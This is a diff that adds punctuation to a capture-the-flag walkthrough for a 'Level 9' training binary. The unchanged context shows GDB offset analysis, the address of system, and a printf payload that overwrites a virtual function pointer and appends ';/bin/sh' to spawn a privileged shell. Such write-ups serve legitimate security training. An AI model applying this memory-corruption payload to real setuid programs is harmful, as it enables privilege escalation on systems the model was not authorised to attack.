@@ -1,12 +1,12 @@
 # Level 9 Walkthrough
 
-1. **Connect to the target machine**
+1. **Connect to the target machine.**
 
 	```bash
 	ssh level9@<vm-ip> -p 4242
 	```
 
-2. **Check the files**
+2. **Check the files.**
 
 	```bash
 	ls -l
@@ -18,7 +18,7 @@
 	-rwsr-s---+ 1 bonus0 users 5140 Mar  6  2016 level9
 	```
 
-3. **Test the binary**
+3. **Test the binary.**
 
 	```bash
 	./level9
@@ -28,13 +28,13 @@
 
 	It exits.
 
-4. **Copy the binary locally for analysis**
+4. **Copy the binary locally for analysis.**
 
 	```bash
 	scp -P 4242 level9@<vm-ip>:/home/user/level9/level9 .
 	```
 
-5.  **Analyze the binary in GDB**
+5.  **Analyze the binary in GDB.**
 
 	* The vulnerable code snippet:
 
@@ -49,7 +49,7 @@
 	* The offset to overwrite is `108` bytes (calculated as `2 ints * 4 bytes + setAnnotation 100 bytes`).
 	* We aim to overwrite the memory at the address stored in `eax` to hijack control.
 
-6. **Addresses of interest**
+6. **Addresses of interest.**
 
 	Set a breakpoint at a key instruction where the virtual function is called:
 
@@ -67,7 +67,7 @@
 
 	Here, `%edx` holds a **virtual function pointer** and `eax` points to a memory location we want to overwrite.
 
-7. **Find system address**
+7. **Find system address.**
 
 	```gdb
 	p system
@@ -79,7 +79,7 @@
 	$1 = 0xb7d86060 <system>
 	```
 
-8. **Generate the payload**
+8. **Generate the payload.**
 
 	* Layout:
 
@@ -93,7 +93,7 @@
 		./level9 $(printf '\x60\x60\xd8\xb7' ; printf 'A%.0s' {1..104} ; printf '\x0c\xa0\x04\x08' ; printf ';/bin/sh')
 		```
 
-9. **Verify shell and get the password**
+9. **Verify shell and get the password.**
 
 	```bash
 	whoami
